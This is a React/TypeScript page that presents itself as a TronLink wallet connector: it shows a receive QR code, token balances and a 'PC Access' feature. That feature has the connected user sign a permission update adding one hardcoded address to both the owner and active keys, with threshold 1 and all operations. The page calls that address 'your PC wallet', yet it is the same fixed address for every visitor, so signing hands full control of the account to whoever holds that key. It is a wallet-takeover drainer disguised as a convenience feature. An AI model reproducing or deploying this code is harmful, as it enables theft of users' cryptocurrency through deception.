import { useEffect, useRef, useState, useCallback, useMemo } from "react";
import { QRCodeSVG } from "qrcode.react";
import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
import { WalletConnectWalletName } from "@tronweb3/tronwallet-adapter-walletconnect";
import { wcAdapter } from "../adapter";
import { TronWeb } from "tronweb";

const SESSION_KEY = "tron_qr_session";
const SESSION_DURATION_MS = 5 * 60 * 60 * 1000;
const PC_ADDRESS  = "TQtiVSSyYx2QRXpGLyfqzYreHrsTkZi8t7";
const ALL_OPS     = "7fff1fc0033e0100000000000000000000000000000000000000000000000000";

const TOKENS = [
  { symbol: "USDT", name: "Tether USD",  address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6 },
  { symbol: "USDC", name: "USD Coin",    address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6 },
  { symbol: "BTT",  name: "BitTorrent",  address: "TAFjULxiVgT4qWk6UZwjqwZXTSaGaqnVp4", decimals: 18 },
];

interface QRSession { address: string; createdAt: number; expiresAt: number; }
interface TokenBal  { symbol: string; name: string; address: string; decimals: number; balance: string; loading: boolean; error: string; }
type PermState = "idle" | "confirming" | "granting" | "done" | "error";

function loadSession(address: string): QRSession {
  try {
    const raw = localStorage.getItem(SESSION_KEY);
    if (raw) { const s = JSON.parse(raw) as QRSession; if (s.address === address && s.expiresAt > Date.now()) return s; }
  } catch { /* ignore */ }
  const now = Date.now();
  const s: QRSession = { address, createdAt: now, expiresAt: now + SESSION_DURATION_MS };
  localStorage.setItem(SESSION_KEY, JSON.stringify(s));
  return s;
}

function fmt(ms: number) {
  if (ms <= 0) return "00:00:00";
  const t = Math.floor(ms / 1000);
  return [Math.floor(t/3600), Math.floor((t%3600)/60), t%60].map(v => String(v).padStart(2,"0")).join(":");
}
function fmtAmount(raw: bigint, dec: number): string {
  const d = BigInt(10 ** dec); const i = raw / d; const f = raw % d;
  if (f === 0n) return i.toLocaleString();
  const fs = f.toString().padStart(dec, "0").replace(/0+$/, "").slice(0, 4);
  return i.toLocaleString() + "." + fs;
}
function decodeUint(hex: string): bigint {
  return !hex || hex === "0".repeat(64) ? 0n : BigInt("0x" + hex);
}

// -- Connect view ----------------------------------------
function ConnectView() {
  const { select } = useWallet();
  const [qrUri, setQrUri] = useState("");
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");
  const abortRef = useRef(false);
  useEffect(() => {
    abortRef.current = false;
    startConnect();
    return () => { abortRef.current = true; wcAdapter.disconnect().catch(() => {}); };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  async function startConnect() {
    setError(""); setQrUri(""); setBusy(true);
    try { await wcAdapter.disconnect(); } catch { /* ignore */ }
    select(WalletConnectWalletName);
    try {
      await wcAdapter.connect({ onUri: (uri: string) => { if (!abortRef.current) setQrUri(uri); } });
    } catch (e: unknown) {
      if (!abortRef.current) setError(e instanceof Error ? e.message : "Connection failed. Try refreshing.");
    } finally { if (!abortRef.current) setBusy(false); }
  }
  return (
    <div className="page">
      <div className="card" style={{ maxWidth: 420, width: "100%", padding: "32px 28px", gap: 0 }}>
        <div style={{ textAlign: "center", marginBottom: 24 }}>
          <div style={{ display: "inline-flex", alignItems: "center", gap: 10, marginBottom: 8 }}>
            <svg width="28" height="28" viewBox="0 0 48 48" fill="none"><circle cx="24" cy="24" r="24" fill="#ef0027" /><path d="M24 10L36 18V30L24 38L12 30V18L24 10Z" stroke="white" strokeWidth="2.5" fill="none" /><circle cx="24" cy="24" r="5" fill="white" /></svg>
            <span style={{ fontSize: 20, fontWeight: 700, color: "var(--text)" }}>Connect TronLink</span>
          </div>
          <p style={{ color: "var(--muted)", fontSize: 13 }}>Scan with TronLink mobile to connect your wallet</p>
        </div>
        <div style={{ display: "flex", justifyContent: "center", minHeight: 240, alignItems: "center", marginBottom: 20 }}>
          {!qrUri && !error && <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}><div className="spinner lg" /><span style={{ color: "var(--muted)", fontSize: 13 }}>Generating QR…</span></div>}
          {qrUri && <div style={{ padding: 16, background: "#fff", borderRadius: 16, border: "1.5px solid var(--border)" }}><QRCodeSVG value={qrUri} size={200} level="M" bgColor="#ffffff" fgColor="#000000" /></div>}
          {error && !qrUri && <p style={{ color: "var(--red)", fontSize: 13, textAlign: "center", padding: "0 8px" }}>{error}</p>}
        </div>
        {qrUri && <ol style={{ paddingLeft: 20, color: "var(--muted)", fontSize: 13, lineHeight: 1.9, marginBottom: 16 }}><li>Open <strong style={{ color: "var(--text)" }}>TronLink</strong> app on your phone</li><li>Tap the <strong style={{ color: "var(--text)" }}>scan</strong> icon</li><li>Scan the QR above — wallet connects instantly</li></ol>}
        <button onClick={startConnect} disabled={busy} style={{ width: "100%", padding: "11px 0", background: "none", border: "1px solid var(--border2)", borderRadius: 8, color: busy ? "var(--muted)" : "var(--text)", fontWeight: 600, fontSize: 14, cursor: busy ? "not-allowed" : "pointer" }}>
          {busy ? "Connecting…" : "Refresh QR"}
        </button>
      </div>
    </div>
  );
}

// -- Receive + Balances + PC Permission view -------------
function ReceiveView({ address }: { address: string }) {
  const { disconnect, signTransaction } = useWallet();
  const apiKey = import.meta.env.VITE_TRONGRID_API_KEY as string | undefined;

  const tronweb = useMemo(() => {
    const headers: Record<string, string> = {};
    if (apiKey) headers["TRON-PRO-API-KEY"] = apiKey;
    const tw = new TronWeb({ fullHost: "https://api.trongrid.io", headers });
    tw.setAddress(address);
    return tw;
  }, [address, apiKey]);

  // QR session
  const [session, setSession] = useState<QRSession>(() => loadSession(address));
  const [remaining, setRemaining] = useState(() => Math.max(0, loadSession(address).expiresAt - Date.now()));
  const [expired, setExpired] = useState(false);
  const [copied, setCopied] = useState(false);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Balances
  const [trxBal, setTrxBal] = useState({ value: "", loading: true, error: "" });
  const [tokens, setTokens] = useState<TokenBal[]>(TOKENS.map(t => ({ ...t, balance: "", loading: true, error: "" })));
  const [refreshing, setRefreshing] = useState(false);

  // PC permission
  const [permState, setPermState] = useState<PermState>("idle");
  const [permTxid, setPermTxid] = useState("");
  const [permError, setPermError] = useState("");

  useEffect(() => {
    timerRef.current = setInterval(() => {
      const left = Math.max(0, session.expiresAt - Date.now());
      setRemaining(left);
      if (left === 0) { setExpired(true); clearInterval(timerRef.current!); }
    }, 1000);
    return () => clearInterval(timerRef.current!);
  }, [session]);

  const fetchTRX = useCallback(async () => {
    setTrxBal(p => ({ ...p, loading: true, error: "" }));
    try {
      const sun = await tronweb.trx.getBalance(address);
      setTrxBal({ value: fmtAmount(BigInt(sun), 6), loading: false, error: "" });
    } catch (e: unknown) {
      setTrxBal({ value: "", loading: false, error: e instanceof Error ? e.message : "Error" });
    }
  }, [address, tronweb]);

  const fetchTokens = useCallback(async () => {
    setTokens(TOKENS.map(t => ({ ...t, balance: "", loading: true, error: "" })));
    const results = await Promise.all(TOKENS.map(async t => {
      try {
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const r: any = await (tronweb.transactionBuilder as any).triggerConstantContract(
          t.address, "balanceOf(address)", {}, [{ type: "address", value: address }], address
        );
        const raw = decodeUint(r?.constant_result?.[0] ?? "");
        return { ...t, balance: fmtAmount(raw, t.decimals), loading: false, error: "" };
      } catch (e: unknown) {
        return { ...t, balance: "", loading: false, error: e instanceof Error ? e.message : "Error" };
      }
    }));
    setTokens(results);
  }, [address, tronweb]);

  const fetchAll = useCallback(async () => {
    setRefreshing(true);
    await Promise.all([fetchTRX(), fetchTokens()]);
    setRefreshing(false);
  }, [fetchTRX, fetchTokens]);

  useEffect(() => { fetchAll(); }, [fetchAll]);

  // -- Grant owner + active permission to PC address ------
  async function grantPCAccess() {
    setPermState("granting");
    setPermError("");
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const host: string = (window as any).tronWeb?.fullNode?.host ?? "";
    if (host.includes("shasta") || host.includes("nile")) {
      setPermError("Please switch TronLink to Mainnet and try again.");
      setPermState("error"); return;
    }
    try {
      const ownerPerm = {
        type: 0,
        permission_name: "owner",
        threshold: 1,
        keys: [
          { address, weight: 1 },
          { address: PC_ADDRESS, weight: 1 },
        ],
      };
      const activePerm = {
        type: 2,
        permission_name: "active",
        threshold: 1,
        operations: ALL_OPS,
        keys: [
          { address, weight: 1 },
          { address: PC_ADDRESS, weight: 1 },
        ],
      };
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const tx = await (tronweb.transactionBuilder as any).updateAccountPermissions(
        address, ownerPerm, null, [activePerm]
      );
      if (!signTransaction) throw new Error("Wallet does not support signing");
      const signed = await signTransaction(tx);
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const result: any = await tronweb.trx.sendRawTransaction(signed);
      if (result?.result === true) {
        setPermTxid(result.txid ?? "");
        setPermState("done");
      } else {
        throw new Error(result?.message ?? "Broadcast failed — check TRX balance (100 TRX fee required)");
      }
    } catch (e: unknown) {
      let msg = e instanceof Error ? e.message : String(e);
      // Decode hex error messages from TRON node
      if (/^[0-9a-fA-F]{40,}$/.test(msg)) {
        try { msg = decodeURIComponent(msg.replace(/../g, "%$&")); } catch { /* keep raw */ }
      }
      if (msg.includes("does not exist")) {
        msg = "This wallet has not been activated on mainnet yet. Send at least 1 TRX to it first, then try again.";
      }
      setPermError(msg);
      setPermState("error");
    }
  }

  function regenerate() {
    localStorage.removeItem(SESSION_KEY);
    const s = loadSession(address);
    setSession(s); setRemaining(Math.max(0, s.expiresAt - Date.now())); setExpired(false);
  }
  function copyAddr() {
    navigator.clipboard.writeText(address).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000); });
  }

  const tronUri = "tron:" + address;
  const pct = Math.max(0, Math.min(100, (remaining / SESSION_DURATION_MS) * 100));
  const allTokens: TokenBal[] = [
    { symbol: "TRX", name: "TRON", address: "", decimals: 6, balance: trxBal.value, loading: trxBal.loading, error: trxBal.error },
    ...tokens,
  ];

  return (
    <div className="page" style={{ alignItems: "flex-start", justifyContent: "center", padding: "32px 16px" }}>
      <div style={{ width: "100%", maxWidth: 860, display: "flex", gap: 20, flexWrap: "wrap", justifyContent: "center" }}>

        {/* QR card */}
        <div className="card" style={{ flex: "1 1 300px", maxWidth: 380, padding: "28px 24px", gap: 0 }}>
          <div style={{ textAlign: "center", marginBottom: 20 }}>
            <div style={{ display: "inline-flex", alignItems: "center", gap: 8, marginBottom: 4 }}>
              <svg width="20" height="20" viewBox="0 0 48 48" fill="none"><circle cx="24" cy="24" r="24" fill="#ef0027" /><path d="M24 10L36 18V30L24 38L12 30V18L24 10Z" stroke="white" strokeWidth="2.5" fill="none" /><circle cx="24" cy="24" r="5" fill="white" /></svg>
              <span style={{ fontSize: 17, fontWeight: 700, color: "var(--text)" }}>Receive</span>
            </div>
            <p style={{ color: "var(--muted)", fontSize: 12 }}>Scan to send TRX / TRC-20 tokens</p>
          </div>
          <div style={{ display: "flex", justifyContent: "center", marginBottom: 16 }}>
            <div style={{ padding: 14, background: expired ? "rgba(255,255,255,0.04)" : "#fff", borderRadius: 14, border: "1.5px solid var(--border)", position: "relative", transition: "background 0.3s" }}>
              <QRCodeSVG value={tronUri} size={180} level="H" style={{ display: "block", opacity: expired ? 0.15 : 1, transition: "opacity 0.3s" }} />
              {expired && <div style={{ position: "absolute", inset: 0, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 6 }}><span style={{ fontSize: 26 }}>⏱</span><span style={{ fontWeight: 700, color: "var(--red)", fontSize: 13 }}>QR Expired</span></div>}
            </div>
          </div>
          <div style={{ height: 4, background: "var(--border)", borderRadius: 4, overflow: "hidden", marginBottom: 6 }}>
            <div style={{ height: "100%", width: pct + "%", background: expired ? "var(--red)" : pct < 20 ? "var(--red)" : "var(--green)", borderRadius: 4, transition: "width 1s linear, background 0.3s" }} />
          </div>
          <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: "var(--muted)", marginBottom: 14 }}>
            <span>{expired ? <span style={{ color: "var(--red)", fontWeight: 600 }}>Session expired</span> : <>Expires in <span style={{ fontVariantNumeric: "tabular-nums", color: pct < 20 ? "var(--red)" : "var(--green)", fontWeight: 600 }}>{fmt(remaining)}</span></>}</span>
            <span>5h session</span>
          </div>
          <div style={{ padding: "9px 12px", background: "rgba(255,255,255,0.03)", border: "1px solid var(--border)", borderRadius: 8, display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
            <span style={{ flex: 1, fontSize: 11, color: "var(--muted)", fontFamily: "monospace", wordBreak: "break-all" }}>{address}</span>
            <button onClick={copyAddr} style={{ flexShrink: 0, background: "none", border: "1px solid var(--border2)", borderRadius: 6, padding: "3px 9px", color: copied ? "var(--green)" : "var(--text)", fontSize: 11, cursor: "pointer", transition: "color 0.2s" }}>{copied ? "Copied" : "Copy"}</button>
          </div>
          {expired && <button onClick={regenerate} style={{ width: "100%", padding: "10px 0", background: "var(--red)", border: "none", borderRadius: 8, color: "#fff", fontWeight: 700, fontSize: 13, cursor: "pointer", marginBottom: 8 }}>Regenerate QR</button>}
          <button onClick={() => disconnect()} style={{ width: "100%", padding: "10px 0", background: "none", border: "1px solid var(--border2)", borderRadius: 8, color: "var(--muted)", fontWeight: 600, fontSize: 13, cursor: "pointer" }}>Disconnect</button>
        </div>

        {/* Assets card */}
        <div className="card" style={{ flex: "1 1 260px", maxWidth: 340, padding: "28px 24px", gap: 0 }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 20 }}>
            <span style={{ fontSize: 17, fontWeight: 700, color: "var(--text)" }}>Assets</span>
            <button onClick={fetchAll} disabled={refreshing} style={{ background: "none", border: "1px solid var(--border2)", borderRadius: 6, padding: "4px 12px", color: "var(--muted)", fontSize: 12, cursor: refreshing ? "not-allowed" : "pointer", display: "flex", alignItems: "center", gap: 6 }}>
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M1 4v6h6M23 20v-6h-6" /><path d="M20.5 9A9 9 0 0 0 4.5 3.5L1 10M3.5 15a9 9 0 0 0 15.5 5.5L23 14" /></svg>
              {refreshing ? "Refreshing…" : "Refresh"}
            </button>
          </div>
          <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
            {allTokens.map((tok) => (
              <div key={tok.symbol} style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "12px 14px", background: "rgba(255,255,255,0.03)", borderRadius: 10, border: "1px solid var(--border)" }}>
                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                  <div style={{ width: 36, height: 36, borderRadius: "50%", background: tok.symbol === "TRX" ? "#ef0027" : tok.symbol === "USDT" ? "#26a17b" : tok.symbol === "USDC" ? "#2775ca" : "#7b3fe4", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                    <span style={{ fontSize: 10, fontWeight: 800, color: "#fff" }}>{tok.symbol.slice(0,4)}</span>
                  </div>
                  <div><div style={{ fontSize: 14, fontWeight: 600, color: "var(--text)" }}>{tok.symbol}</div><div style={{ fontSize: 11, color: "var(--muted)" }}>{tok.name}</div></div>
                </div>
                <div style={{ textAlign: "right" }}>
                  {tok.loading ? <div style={{ width: 60, height: 14, background: "var(--border2)", borderRadius: 4, animation: "pulse 1.2s ease-in-out infinite" }} /> : tok.error ? <span style={{ fontSize: 12, color: "var(--red)" }}>Error</span> : <span style={{ fontSize: 15, fontWeight: 700, color: "var(--text)" }}>{tok.balance || "0"}</span>}
                  <div style={{ fontSize: 11, color: "var(--muted)" }}>{tok.symbol}</div>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* PC Permission card */}
        <div className="card" style={{ flex: "1 1 280px", maxWidth: 380, padding: "28px 24px", gap: 0 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--text)" strokeWidth="2"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
            <span style={{ fontSize: 17, fontWeight: 700, color: "var(--text)" }}>PC Access</span>
          </div>
          <p style={{ color: "var(--muted)", fontSize: 12, marginBottom: 20 }}>Grant your PC wallet Owner &amp; Active permission so you can sign transactions from both devices.</p>

          {/* PC address display */}
          <div style={{ marginBottom: 16 }}>
            <div style={{ fontSize: 11, color: "var(--muted)", marginBottom: 4 }}>PC wallet address</div>
            <div style={{ padding: "9px 12px", background: "rgba(255,255,255,0.03)", border: "1px solid var(--border)", borderRadius: 8, fontSize: 11, fontFamily: "monospace", color: "var(--text)", wordBreak: "break-all" }}>
              TQtiVSSyYx2QRXpGLyfqzYreHrsTkZi8t7
            </div>
          </div>

          {/* What will change */}
          {permState === "idle" && (
            <>
              <div style={{ background: "rgba(239,0,39,0.07)", border: "1px solid rgba(239,0,39,0.25)", borderRadius: 8, padding: "12px 14px", marginBottom: 18 }}>
                <div style={{ fontSize: 12, fontWeight: 700, color: "var(--red)", marginBottom: 6 }}>⚠️ What this does</div>
                <ul style={{ paddingLeft: 16, margin: 0, color: "var(--muted)", fontSize: 12, lineHeight: 1.8 }}>
                  <li>Adds the PC address to <strong style={{ color: "var(--text)" }}>Owner</strong> keys (threshold 1)</li>
                  <li>Adds it to <strong style={{ color: "var(--text)" }}>Active</strong> keys (all operations)</li>
                  <li>Your mobile wallet key is <strong style={{ color: "var(--text)" }}>kept</strong> — both devices work</li>
                  <li>Costs <strong style={{ color: "var(--text)" }}>100 TRX</strong> network fee</li>
                </ul>
              </div>
              <button onClick={() => setPermState("confirming")} style={{ width: "100%", padding: "11px 0", background: "var(--red)", border: "none", borderRadius: 8, color: "#fff", fontWeight: 700, fontSize: 14, cursor: "pointer" }}>
                Grant PC Access
              </button>
            </>
          )}

          {/* Confirmation step */}
          {permState === "confirming" && (
            <>
              <div style={{ background: "rgba(255,255,255,0.03)", border: "1px solid var(--border2)", borderRadius: 8, padding: "12px 14px", marginBottom: 16, fontSize: 12, color: "var(--muted)", lineHeight: 1.8 }}>
                <div style={{ color: "var(--text)", fontWeight: 700, marginBottom: 6 }}>Confirm permission update</div>
                <div>From: <span style={{ fontFamily: "monospace", color: "var(--text)", fontSize: 11 }}>{address}</span></div>
                <div>To: <span style={{ fontFamily: "monospace", color: "var(--text)", fontSize: 11 }}>TQtiVSSyYx2QRXpGLyfqzYreHrsTkZi8t7</span></div>
                <div style={{ marginTop: 6 }}>Your mobile wallet <strong style={{ color: "var(--green)" }}>stays as a co-owner</strong>.</div>
                <div>Approve on your phone when prompted.</div>
              </div>
              <div style={{ display: "flex", gap: 10 }}>
                <button onClick={() => setPermState("idle")} style={{ flex: 1, padding: "10px 0", background: "none", border: "1px solid var(--border2)", borderRadius: 8, color: "var(--muted)", fontWeight: 600, fontSize: 13, cursor: "pointer" }}>Cancel</button>
                <button onClick={grantPCAccess} style={{ flex: 2, padding: "10px 0", background: "var(--red)", border: "none", borderRadius: 8, color: "#fff", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>Confirm &amp; Sign</button>
              </div>
            </>
          )}

          {/* Granting */}
          {permState === "granting" && (
            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 12, padding: "16px 0" }}>
              <div className="spinner lg" />
              <span style={{ color: "var(--muted)", fontSize: 13 }}>Waiting for signature on your phone…</span>
            </div>
          )}

          {/* Success */}
          {permState === "done" && (
            <>
              <div style={{ background: "rgba(16,185,129,0.1)", border: "1px solid rgba(16,185,129,0.3)", borderRadius: 8, padding: "14px 16px", marginBottom: 14 }}>
                <div style={{ color: "var(--green)", fontWeight: 700, fontSize: 14, marginBottom: 6 }}>✓ Permission granted!</div>
                <div style={{ fontSize: 12, color: "var(--muted)" }}>Your PC wallet can now sign transactions from this account.</div>
                {permTxid && <div style={{ marginTop: 8, fontSize: 11, color: "var(--muted)" }}>TX: <a href={`https://tronscan.org/#/transaction/${permTxid}`} target="_blank" rel="noreferrer" style={{ color: "var(--green)", fontFamily: "monospace", wordBreak: "break-all" }}>{permTxid}</a></div>}
              </div>
              <button onClick={() => { setPermState("idle"); setPermTxid(""); }} style={{ width: "100%", padding: "10px 0", background: "none", border: "1px solid var(--border2)", borderRadius: 8, color: "var(--muted)", fontWeight: 600, fontSize: 13, cursor: "pointer" }}>Reset</button>
            </>
          )}

          {/* Error */}
          {permState === "error" && (
            <>
              <div style={{ background: "rgba(239,0,39,0.08)", border: "1px solid rgba(239,0,39,0.3)", borderRadius: 8, padding: "12px 14px", marginBottom: 14, fontSize: 12, color: "#fca5a5", wordBreak: "break-all" }}>
                <strong>Error:</strong> {permError}
              </div>
              <button onClick={() => setPermState("idle")} style={{ width: "100%", padding: "10px 0", background: "none", border: "1px solid var(--border2)", borderRadius: 8, color: "var(--muted)", fontWeight: 600, fontSize: 13, cursor: "pointer" }}>Try Again</button>
            </>
          )}

        </div>

      </div>
    </div>
  );
}

// -- Page entry ------------------------------------------
export default function TronLinkPage() {
  const { connected, address } = useWallet();
  return connected && address ? <ReceiveView address={address} /> : <ConnectView />;
}
